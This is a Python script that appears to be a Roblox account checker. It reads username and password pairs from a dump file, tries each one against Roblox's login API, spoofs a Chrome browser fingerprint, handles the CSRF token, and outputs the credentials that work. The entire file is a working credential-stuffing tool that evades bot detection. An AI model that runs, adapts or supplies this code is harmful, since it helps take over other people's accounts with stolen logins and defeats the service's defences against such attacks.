import json
import sys
import time
import re
from curl_cffi import requests

def parse_credentials(content):
    lines = [l.strip() for l in content.split('\n') if l.strip()]
    creds = []
    current = {}
    in_block = False
    for line in lines:
        lower = line.lower()
        if lower.startswith('username:'):
            if current.get('username') and current.get('password'):
                creds.append((current['username'], current['password']))
            current = {'username': line.split(':', 1)[1].strip(), 'password': None}
            in_block = True
        elif lower.startswith('password:'):
            current['password'] = line.split(':', 1)[1].strip()
        elif lower.startswith('ip') and ('address:' in lower or lower.startswith('ip:')):
            if current.get('username') and current.get('password'):
                creds.append((current['username'], current['password']))
            current = {}
            in_block = False
        else:
            if in_block and not current.get('username') and not ':' in line:
                current['username'] = line
            elif in_block and current.get('username') and not current.get('password') and not ':' in line:
                current['password'] = line
    if current.get('username') and current.get('password'):
        creds.append((current['username'], current['password']))
    return creds

def check_credential(username, password):
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
    })
    csrf_resp = session.post("https://auth.roblox.com/v2/login", json={}, impersonate="chrome120")
    csrf = csrf_resp.headers.get("x-csrf-token")
    if not csrf:
        return "error", "No CSRF token"
    session.headers["X-CSRF-TOKEN"] = csrf
    payload = {"ctype": "Username", "cvalue": username, "password": password}
    login_resp = session.post("https://auth.roblox.com/v2/login", json=payload, impersonate="chrome120")
    if login_resp.status_code == 200:
        return "valid", None
    if login_resp.status_code == 403:
        challenge_id = login_resp.headers.get("rblx-challenge-id")
        if challenge_id:
            return "challenge", challenge_id
        else:
            return "invalid", "403 without challenge"
    if login_resp.status_code in (400, 401):
        return "invalid", f"HTTP {login_resp.status_code}"
    return "error", f"HTTP {login_resp.status_code}"

def main():
    if len(sys.argv) < 2:
        print(json.dumps({"error": "No file provided"}))
        sys.exit(1)
    filename = sys.argv[1]
    try:
        with open(filename, 'r') as f:
            content = f.read()
    except Exception as e:
        print(json.dumps({"error": f"File read error: {e}"}))
        sys.exit(1)

    creds = parse_credentials(content)
    if not creds:
        print(json.dumps({"error": "No credentials found"}))
        sys.exit(1)

    result = {
        "total": len(creds),
        "valid": 0,
        "invalid": 0,
        "challenge": 0,
        "valid_lines": []
    }
    delay = 2

    for i, (username, password) in enumerate(creds, 1):
        status, extra = check_credential(username, password)
        if status == "valid":
            result["valid"] += 1
            result["valid_lines"].append(f"{username}:{password}")
        elif status == "challenge":
            result["challenge"] += 1
        elif status == "invalid":
            result["invalid"] += 1
        else:
            result["invalid"] += 1
        if i < len(creds):
            time.sleep(delay)

    print(json.dumps(result))

if __name__ == "__main__":
    main()